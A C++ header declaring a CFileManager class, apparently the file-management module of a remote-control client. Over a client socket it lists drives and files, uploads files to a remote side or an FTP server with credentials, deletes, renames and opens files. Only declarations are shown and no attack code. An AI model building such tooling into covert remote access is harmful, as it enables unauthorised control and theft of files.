#ifndef __TSP_FILEMANAGER_H__
#define __TSP_FILEMANAGER_H__

#include "Tsplist.h"
#include "Manager.h"

typedef BOOL(WINAPI *pFunFilterFile)(LPVOID lpThis, LPSTR lpFileName);

class CFileManager : public CManager
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	UINT SendDriveList();
	BOOL SetFilterFun(pFunFilterFile funFilter, LPVOID lpThis);
	BOOL UploadToRemote(LPBYTE lpBuffer);
	BOOL FtpUpLoad(TCHAR *szUrl,WORD dwFtpProt,TCHAR *szUserName,TCHAR *szPass,TCHAR *szLocalDir,TCHAR *szRemoteFileName);  



public:
	CFileManager(CClientSocket *pClient, BOOL bSend = TRUE);
	virtual ~CFileManager();

private:
	typedef struct 
	{
		DWORD	dwSizeHigh;
		DWORD	dwSizeLow;
	}FILESIZE;

    CTspList m_UploadList;
	UINT m_nTransferMode;
	char m_strCurrentProcessFileName[MAX_PATH]; //当前正在处理的文件
	UINT64 m_nCurrentProcessFileLength; //当前正在处理的文件的长度

	CRITICAL_SECTION m_cs;

	BOOL FixedUploadList(LPCTSTR lpszDirectory);
	void StopTransfer();
	UINT SendFilesList(LPCTSTR lpszDirectory);
	BOOL DeleteDirectory(LPCTSTR lpszDirectory);
	UINT SendFileSize(LPCTSTR lpszFileName);
	UINT SendFileData(LPBYTE lpBuffer);
	void CreateFolder(LPBYTE lpBuffer);
	void Rename(LPBYTE lpBuffer);
	int	SendToken(BYTE bToken);

	void CreateLocalRecvFile(LPBYTE lpBuffer);
	void SetTransferMode(LPBYTE lpBuffer);
	void GetFileData();
	void WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize);
	void UploadNext();
	BOOL OpenFile(LPCTSTR lpFile, INT nShowCmd);
	static pFunFilterFile m_pFunFilterFile;
	static LPVOID m_pFunThis;
};

#endif //__TSP_FILEMANAGER_H__
